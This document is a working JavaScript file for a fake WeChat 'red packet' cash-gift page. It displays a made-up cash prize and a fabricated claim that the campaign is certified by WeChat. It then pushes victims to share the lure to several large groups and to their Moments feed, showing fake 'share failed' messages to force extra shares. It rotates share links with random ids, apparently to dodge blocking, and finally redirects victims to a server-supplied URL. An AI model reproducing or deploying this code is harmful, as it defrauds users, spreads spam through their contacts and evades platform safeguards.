var aam = '';
var bbm = '';
var money = ranmo();
var address = localAddress['city'] ? localAddress['city'] : (localAddress['province'] ? localAddress['province'] : '北京');
var city = address.replace(/(.*)市/, '$1');
city = city.replace(/(.*)省/, '$1');

document.title = '';

setTimeout(function () {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}, 200);

document.write('<!DOCTYPE html><html lang="en"><head><meta charset="gbk"><title></title><meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"><link rel="stylesheet" href="https://pixk.oss-cn-shanghai.aliyuncs.com/new/2019/s.css"/></head><body><div id="tk" class="share-body"><div class="share-container"><h3 class="share-container-bg-title">分享点这里</h3><div class="share-prompt"><p>点击右上角，分享到 <i class="icon_share"></i><span class="js_share_to_desc"> 微信群</span></p><p>即可领取￥<span class="js_share_to_desc">' + window["name"] + '</span></p></div><div class="red-packet"><img src="http://bj.bcebos.com/mtcapp//png/aecaed3d39e08a3b08c0b6d825a58d74.png"><p>恭喜发财</p></div></div></div></body></html>');

weui = {
    alert: function (_3635x6, _3635x7, _3635x8, _3635x9) {
        var _3635xa, _3635xb;
        _3635x8 = _3635x8 ? _3635x8 : "我知道了";
        _3635xa = unescape('%3Cdiv%20id%3D%22dialog%22%20class%3D%22mod-popup%20single-btn-popup%22%3E%3Cdiv%20class%3D%22popup-body%22%3E%3Ch3%20class%3D%22popup-title%22%3E%3C/h3%3E%3Cdiv%20class%3D%22popup-cont%22%3E%3C/div%3E%3Cdiv%20class%3D%22popup-btn%22%3E%3Ca%20class%3D%22js_global_dialog_submit_btn%22%3E%3Cspan%3E%u6211%u77E5%u9053%u4E86%3C/span%3E%3C/a%3E%3C/div%3E%3C/div%3E%3C/div%3E');

        $("#dialog").length > 0 ? $("#dialog .popup-cont").empty() : $('body').append(_3635xa);

        _3635xb = $("#dialog");
        _3635xb.show();
        _3635xb.find(".popup-title").html(_3635x6);
        _3635xb.find(".popup-cont").html(_3635x7);
        _3635xb.find(".js_global_dialog_submit_btn").html(_3635x8);

        _3635xb.find(".popup-btn").off('click').on('click',function () {
                _3635xb.hide();
                _3635x9 && _3635x9();
        });
    },
    loading: function () {
        var _3635xa = '<div id="loading" class="mod-popup single-btn-popup"><div class="popup-body" style="margin-top: 50%;"><div class="popup-cont"></div></div></div>',
            _3635x7 = '<img style="width: 30px" src="http://bj.bcebos.com/mtcapp//gif/fd46fe4ac95f637cc6b33887f13cd6bb.gif"><br><b style="font-size: 20px;color: red">正在查询红包数据...</b>';
        $("#loading").length > 0 ? $("#dialog .popup-cont").empty() : $('body').append(_3635xa);
        var u = $("#loading");
        u.show();
        u.find('.popup-cont').html(_3635x7);
    }
};
weui.loading();

$(function () {
    $.ajax({
        type: "POST",
        url: apidomain,
        data: {index:'jump',url: location.href.split('#')[0]},
        dataType: "json",
        beforeSend: function () {
            $("meta[name=referrer]").attr("content", "always");
        },
        success: function (res) {
            window["result"] = config_json(res);
            share_config(window["result"]);
            setTimeout(function () {
                $("#loading").hide();
                $("#tk").trigger('click');
            }, 500);

            switch (share) {
                case 0:
                    window["result"]["t"]["title"] = _f["s"]["title1"];
                    window["result"]["t"]["desc"] = _f["s"]["desc1"];
                    window["result"]["t"]["link"] = _f["f"][0];
                    window["result"]["t"]["img_url"] = _f["s"]["img1"];
                    configReload(1);
                    break;
            }

        }
    })
});


$('#tk').on('click', function () {
    switch (share) {
        case 0:
            weui.alert('<span style="font-size: 23px;color:#1BBC9B;">恭喜您</span>', '<span>您获得现金红包</span><br><span style="font-size: 20px;color:red;">' + window["name"] + '元</span><br><span style="color:red;">活动宗旨为提高公司知名度<br>分享到群后</span><span style="color:#1BBC9B; font-size: 20px;">即可领取</span><br><br><span>红包总额仅剩</span><span style="font-size: 20px;color:red;">' + money + '万</span>元,先到先得，活动经微信认证，真实有效！');
            break;
        case 1:
            weui.alert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>', '<br/>请继续分享到<b style="font-size: 20px;color: red">2</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>');
            break;
        case 2:
            weui.alert('<b style="font-size: 22px;color: red;">分享失败！</b>', '<br/>注意：<span color="red">分享到相同的群会失败</span><br>请尝试重新分享到<b style="font-size: 20px;color: red">2个不同的群</b><br>');
            break;
        case 3:
            weui.alert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>', '<br/>请继续分享到<b style="font-size: 20px;color: red">1</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>');
            break;
        case 4:
            weui.alert('<b style="font-size: 22px;color: red;">分享失败！</b>', '<br/>注意：<span color="red">群人数必须大于50人</span><br>请尝试重新分享到<b style="font-size: 20px;color: red">>50人的群</b><br>');
            break;
        case 5:
            weui.alert('<b style="font-size: 22px;color: red;">分享失败！</b>', '<br/>注意：<span color="red">分享到相同的群会失败</span><br>请尝试重新分享到<b style="font-size: 20px;color: red">1个不同的群</b><br>');
            break;
        case 6:
            weui.alert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>', '<br/>剩下最后一步啦！<br />请分享到<span style="font-size: 20px;color:red">朋友圈</span>，获赠<b style="font-size: 18px;color: red;">' + window["name"] + '</b>元💰立即到账！');
            break;
        case 7:
            weui.alert('<b style="font-size: 22px;color: red;">分享失败！</b>', '<br/>注意：必须<span style="color:red">公开分享</span>哦!<br>请尝试重新分享到<b style="font-size: 20px;color: red">朋友圈</b><br>');
            break;
        case 8:
            weui.alert('<span style="font-size: 20px;color: red;">恭喜你</span>', '您获得￥<span style="font-size: 20px;color: red;">' + window["name"] + '</span>元现金红包<br>金额已提交银行打款，预计1小时内到账（跨行次日到账，非工作时间[09:00-17:00]次日到账），请注意查收微信绑定银行卡到账情况！', "我知道了", kikm)
    }
});

function share_tips() {
    share++;
    switch (share) {
        case 1:
            window["result"]["t"]["title"] = _f["s"]["title2"];
            window["result"]["t"]["desc"] = _f["s"]["desc2"];
            window["result"]["t"]["link"] = _f["f"][1];
            window["result"]["t"]["img_url"] = _f["s"]["img2"];
            configReload(1);
            weui.alert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>', '<br/>请继续分享到<b style="font-size: 20px;color: red">2</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>');

            break;
        case 2:
            window["result"]["t"]["title"] = _f["s"]["title3"];
            window["result"]["t"]["desc"] = _f["s"]["desc3"];
            window["result"]["t"]["link"] = _f["f"][2];
            window["result"]["t"]["img_url"] = _f["s"]["img3"];
            configReload(1);

            weui.alert('<b style="font-size: 22px;color: red;">分享失败！</b>', '<br/>注意：<span color="red">分享到相同的群会失败</span><br>请尝试重新分享到<b style="font-size: 20px;color: red">2个不同的群</b><br>');

            break;
        case 3:
            window["result"]["t"]["title"] = _f["s"]["title4"];
            window["result"]["t"]["desc"] = _f["s"]["desc4"];
            window["result"]["t"]["link"] = _f["f"][3];
            window["result"]["t"]["img_url"] = _f["s"]["img4"];
            configReload(1);

            weui.alert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>', '<br/>请继续分享到<b style="font-size: 20px;color: red">1</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>');

            break;
        case 4:
            window["result"]["t"]["title"] = _f["s"]["title5"];
            window["result"]["t"]["desc"] = _f["s"]["desc5"];
            window["result"]["t"]["link"] = _f["f"][4];
            window["result"]["t"]["img_url"] = _f["s"]["img5"];
            configReload(1);

            weui.alert('<b style="font-size: 22px;color: red;">分享失败！</b>', '<br/>注意：<span color="red">群人数必须大于50人</span><br>请尝试重新分享到<b style="font-size: 20px;color: red">>50人的群</b><br>');

            break;
        case 5:
            window["result"]["t"]["title"] = _f["s"]["title6"];
            window["result"]["t"]["desc"] = _f["s"]["desc6"];
            window["result"]["t"]["link"] = _f["f"][5];
            window["result"]["t"]["img_url"] = _f["s"]["img6"];
            configReload(1);

            weui.alert('<b style="font-size: 22px;color: red;">分享失败！</b>', '<br/>注意：<span color="red">分享到相同的群会失败</span><br>请尝试重新分享到<b style="font-size: 20px;color: red">1个不同的群</b><br>');

            break;
        case 6:
            window["result"]["t"]["title"] = _f["s"]["ptitle0"];
            window["result"]["t"]["link"] = _f["f"][6];
            window["result"]["t"]["img_url"] = _f["s"]["pimg0"];
            configReload(2);

            weui.alert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>', '<br/>剩下最后一步啦！<br />请分享到<span style="font-size: 20px;color:red">朋友圈</span>，获赠<b style="font-size: 18px;color: red;">' + window["name"] + '</b>元💰立即到账！');

            break;
        case 7:
            window["result"]["t"]["title"] = _f["s"]["ptitle1"];
            window["result"]["t"]["link"] = _f["f"][7];
            window["result"]["t"]["img_url"] = _f["s"]["pimg1"];
            configReload(2);

            weui.alert('<b style="font-size: 22px;color: red;">分享失败！</b>', '<br/>注意：必须<span style="color:red">公开分享</span>哦!<br>请尝试重新分享到<b style="font-size: 20px;color: red">朋友圈</b><br>');

            break;
        case 8:
            window["result"]["t"]["title"] = _f["s"]["ptitle2"];
            window["result"]["t"]["link"] = _f["f"][8];
            window["result"]["t"]["img_url"] = _f["s"]["pimg2"];
            var _bhw = bbm;

            weui.alert('<span style="font-size: 20px;color: red;">恭喜你</span>', '您获得￥<span style="font-size: 20px;color: red;">' + window["name"] + '</span>元现金红包<br>金额已提交银行打款，预计1小时内到账（跨行次日到账，非工作时间[09:00-17:00]次日到账），请注意查收微信绑定银行卡到账情况！', "我知道了", kikm);

            break;

        default:
            weui.alert('<span style="font-size: 23px;color:#1BBC9B;">恭喜您</span>', '<span>您获得现金红包</span><br><span style="font-size: 20px;color:red;">' + window["name"] + '元</span><br><span style="color:red;">活动宗旨为提高公司知名度<br>分享到群后</span><span style="color:#1BBC9B; font-size: 20px;">即可领取</span><br><br><span>红包总额仅剩</span><span style="font-size: 20px;color:red;">' + money + '万</span>元,先到先得，活动经微信认证，真实有效！');
            break;
    }
}

function config_json(args) {
    var configData = {
        "config": args.config,
      	"qun": args.qun,
      	"quan": args.quan,
        "t": {
            "title": "",
            "desc": "",
            "img_url": "",
            "link": location.href,
            "type": "link"
        }
    };
    return configData;
}

function share_config(data) {
    aam = data["qun"];
    bbm = data["quan"];
    wx.config(data["config"]);
    wx.ready(function () {
        wx.hideMenuItems({
            menuList: ["menuItem:share:qq", "menuItem:share:weiboApp", "menuItem:favorite", "menuItem:setFont", "menuItem:copyUrl", "menuItem:readMode", "menuItem:openWithQQBrowser", "menuItem:share:email", "menuItem:share:facebook", "menuItem:share:QZone", "menuItem:share:timeline", "menuItem:openWithSafari"]
        })
    })
}

function configReload(type) {
    wx.config(window["result"]["config"]);
    wx.ready(function () {
        if (type == 1) {
            wx.hideMenuItems({
                menuList: ["menuItem:share:timeline"]
            });
            wx.onMenuShareAppMessage({
                title: window["result"]["t"]["title"],
                desc: window["result"]["t"]["desc"],
                link: window["result"]["t"]["link"].replace(/{domain}/, aam).replace(/{pmain}/, bbm).replace(/\*/, makeid()),
                imgUrl: window["result"]["t"]["img_url"],
                type: "link",
                success: function () {
                    share_tips();
                }
            })
        } else {
            wx.hideMenuItems({
                menuList: ["menuItem:share:appMessage"]
            });
            wx.showMenuItems({
                menuList: ["menuItem:share:timeline"]
            });
            wx.onMenuShareTimeline({
                title: window["result"]["t"]["title"],
                link: window["result"]["t"]["link"].replace(/{domain}/, aam).replace(/{pmain}/, bbm).replace(/\*/, makeid()),
                imgUrl: window["result"]["t"]["img_url"],
                type: "link",
                success: function () {
                    share_tips();
                }
            })
        }
    })
}

function kikm() {
    location.href = _bhw;
}

function ranmo() {
    var money = parseInt(1000 * (parseFloat(1000 * Math.random()) + 200));
    money = parseFloat(money / 1000).toFixed(1);
    return money;
}

function makeid() {
    var rander = '';
    var str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (var i = 0; i < Math.floor(Math.random() * 10 + 2); i++) {
        rander += str.charAt(Math.floor(Math.random() * str.length));
    };
    return rander;
}